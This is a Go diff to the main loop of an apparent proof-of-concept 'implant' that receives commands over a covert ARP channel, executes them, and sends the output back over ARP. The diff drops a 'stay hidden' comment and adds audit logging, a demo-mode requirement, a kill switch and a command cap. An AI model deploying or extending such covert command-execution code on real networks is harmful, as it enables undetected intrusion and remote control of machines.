@@ -11,9 +11,24 @@ import (
 )
 
 func main() {
-	// Suppress console output to stay hidden (Windows)
-	// This is a PoC; in production use, silence wouldn't need to log at all
-	log.SetOutput(os.Stderr) // At least direct to stderr
+	logPath, err := shared.SetupAuditLogger("implant")
+	if err != nil {
+		log.Fatalf("[!] failed to configure implant audit logging: %v\n", err)
+	}
+	if err := shared.EnsureDemoMode("implant"); err != nil {
+		log.Fatalf("[!] %v\n", err)
+	}
+
+	stopPath, enabled, err := shared.KillSwitchPresent()
+	if err != nil {
+		log.Fatalf("[!] failed to inspect local kill switch: %v\n", err)
+	}
+	if enabled {
+		log.Fatalf("[!] kill switch already present at %s\n", stopPath)
+	}
+
+	maxCommands := shared.MaxDemoCommands()
+	log.Printf("[AUDIT] implant demo mode enabled; audit_log=%s stop_file=%s max_commands=%d pid=%d\n", logPath, stopPath, maxCommands, os.Getpid())
 
 	// Step 1: Find active network interface
 	iface, err := implant.FindActiveInterface()
@@ -31,7 +46,10 @@ func main() {
 
 	// Step 3: Create broadcaster for responses
 	broadcaster := implant.NewARPBroadcaster(iface)
-	broadcaster.Handle, _ = iface.GetDeviceHandle()
+	broadcaster.Handle, err = iface.GetDeviceHandle()
+	if err != nil {
+		log.Fatalf("[!] Failed to create response handle: %v\n", err)
+	}
 	defer broadcaster.Close()
 
 	// Step 4: Create executor for commands
@@ -51,23 +69,48 @@ func main() {
 	commandCh := sniffer.GetCommandChannel()
 	sigCh := make(chan os.Signal, 1)
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
+	executedCommands := 0
 
 	for {
 		select {
-		case command := <-commandCh:
+		case command, ok := <-commandCh:
+			if !ok {
+				log.Printf("[AUDIT] sniffer command channel closed; exiting\n")
+				return
+			}
+
+			stopPath, enabled, err := shared.KillSwitchPresent()
+			if err != nil {
+				log.Printf("[AUDIT] failed to inspect kill switch: %v\n", err)
+			}
+			if enabled {
+				log.Printf("[AUDIT] kill switch detected at %s; shutting down before execution\n", stopPath)
+				return
+			}
+			if executedCommands >= maxCommands {
+				log.Printf("[AUDIT] max demo command budget reached (%d); exiting\n", maxCommands)
+				return
+			}
+
 			// Execute command
-			log.Printf("[*] Executing: %s\n", command)
+			log.Printf("[AUDIT] executing allowed command #%d: %s\n", executedCommands+1, shared.SummarizeForAudit(command, shared.AuditPreviewLimit))
 			output, err := executor.Execute(command)
 			if err != nil {
+				log.Printf("[AUDIT] command execution rejected or failed: %v\n", err)
 				output = "[ERROR] " + err.Error()
+			} else {
+				log.Printf("[AUDIT] %s\n", implant.GetCommandExecutionSummary(command, output))
 			}
 
 			// Send response via ARP
-			_ = broadcaster.SendResponse(output)
+			if err := broadcaster.SendResponse(output); err != nil {
+				log.Printf("[AUDIT] failed to send response: %v\n", err)
+			}
+			executedCommands++
 
 		case <-sigCh:
 			// Graceful shutdown on Ctrl+C or SIGTERM
-			log.Printf("[*] Shutting down...\n")
+			log.Printf("[AUDIT] received shutdown signal; exiting\n")
 			return
 		}
 	}
